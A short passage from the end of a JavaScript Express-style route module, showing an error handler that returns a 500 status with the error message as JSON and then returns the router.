            res.status(500).json({ error: err.message });
        }
    });

    return router;
}
